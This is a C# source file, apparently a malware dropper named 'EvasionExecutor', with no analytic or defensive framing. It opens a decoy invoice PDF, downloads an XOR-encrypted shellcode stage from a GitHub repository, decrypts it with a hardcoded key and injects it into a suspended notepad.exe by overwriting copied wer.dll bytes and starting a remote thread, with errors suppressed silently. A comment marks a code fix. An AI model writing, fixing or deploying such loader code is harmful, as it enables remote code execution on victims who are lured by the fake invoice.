using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

public class EvasionExecutor
{
    #region Win32 Structures and Imports
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
    [StructLayout(LayoutKind.Sequential)]
    internal struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

    [DllImport("kernel32.dll")] private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll")] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] private static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")] private static extern bool CloseHandle(IntPtr hObject);
    #endregion

    private static byte[] xorKey = new byte[] { 0x69, 0x30, 0x78, 0x75, 0x46, 0x6e, 0x5a, 0x4f, 0x66, 0x36, 0x39, 0x58, 0x37, 0x62, 0x6b, 0x74, 0x66, 0x33, 0x56, 0x73 };

    public void Trigger()
    {
        try
        {
            RunDecoy();
            WebClient client = new WebClient();
            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
            byte[] encryptedPayload = client.DownloadData("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor");
            byte[] shellcode = new byte[encryptedPayload.Length];
            for (int i = 0; i < encryptedPayload.Length; i++) { shellcode[i] = (byte)(encryptedPayload[i] ^ xorKey[i % xorKey.Length]); }
            
            if (shellcode != null && shellcode.Length > 0)
            {
                InjectAndExecute(shellcode);
            }
        }
        catch { /* Fail silently */ }
    }
    
    private void InjectAndExecute(byte[] shellcode)
    {
        string targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe";
        string moduleToStompPath = "C:\\Windows\\SysWOW64\\wer.dll";
        
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        si.cb = (uint)Marshal.SizeOf(si);
        
        bool success = CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);

        if (success)
        {
            try
            {
                byte[] legitModuleBytes = File.ReadAllBytes(moduleToStompPath);
                IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)legitModuleBytes.Length, 0x3000, 0x40);
                
                // --- THE FIX IS HERE ---
                // CORRECTED: Declared variables to handle the 'out' parameters instead of using '_'.
                IntPtr bytesWritten;
                uint threadId;

                // Write the legitimate DLL first
                WriteProcessMemory(pi.hProcess, remoteAddr, legitModuleBytes, (uint)legitModuleBytes.Length, out bytesWritten);

                // Now stomp over it with our shellcode
                WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out bytesWritten);

                // Create the remote thread
                CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out threadId);
            
                ResumeThread(pi.hThread);
            }
            finally
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
        }
    }
    
    private void RunDecoy()
    {
        try
        {
            using (WebClient pdfClient = new WebClient())
            {
                string tempPdfPath = Path.GetTempPath() + "Invoice-" + Path.GetRandomFileName().Substring(0, 8) + ".pdf";
                pdfClient.DownloadFile("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice%20for%20Load%20ID%2080814532.pdf", tempPdfPath);
                Process.Start(tempPdfPath);
            }
        }
        catch { }
    }
}
